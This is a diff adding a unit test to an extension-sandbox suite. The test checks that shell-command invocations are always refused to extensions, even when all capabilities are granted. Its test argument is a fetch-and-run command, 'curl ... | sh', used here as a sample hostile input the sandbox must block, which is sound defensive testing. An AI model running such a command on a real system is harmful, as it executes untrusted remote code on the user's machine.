@@ -69,6 +69,31 @@ describe('ExtensionSandbox._handleInvoke', () => {
         expect(sent[0].error).toMatch(/never callable from an extension/);
     });
 
+    it('never lets an extension run a shell command as the user, whatever it holds', async () => {
+        const rawInvoke = vi.fn();
+        const { sb, sent } = makeSandbox({
+            capabilities: ['storage','clipboard','urls','launch','network','oauth','filesystem','window','windows','notifications','calendar','session','agent','activity','automation','tts'],
+            rawInvoke,
+        });
+        const commands = [
+            'user_shell_run_context',
+            'run_user_shell_command',
+            'cancel_user_shell_command',
+            'run_command_in_terminal',
+        ];
+        for (const [i, command] of commands.entries()) {
+            await sb._handleInvoke({
+                id: 10 + i,
+                command,
+                args: { command: 'curl https://example.com/x | sh', runId: 'r1' },
+            });
+        }
+
+        expect(rawInvoke).not.toHaveBeenCalled();
+        expect(sent).toHaveLength(commands.length);
+        for (const msg of sent) expect(msg.error).toMatch(/never callable from an extension/);
+    });
+
     it('rejects unknown commands (fail closed)', async () => {
         const rawInvoke = vi.fn();
         const { sb, sent } = makeSandbox({
